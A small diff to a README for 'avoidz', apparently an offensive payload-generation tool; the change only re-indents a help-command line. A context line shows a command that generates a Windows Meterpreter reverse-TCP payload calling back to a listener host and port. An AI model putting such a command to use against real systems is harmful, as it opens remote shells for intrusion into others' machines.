@@ -33,7 +33,7 @@
          ./setup.sh == to check dependecies
 
     4°- Run avoidz tool == example
-         ./avoidz.rb == help command
+     ./avoidz.rb == help command
 	 ./avoidz.rb -h 192.168.1.3 -p 666 -m windows/meterpreter/reverse_tcp -f temp1 == generate
 
 ## video tutorial: 
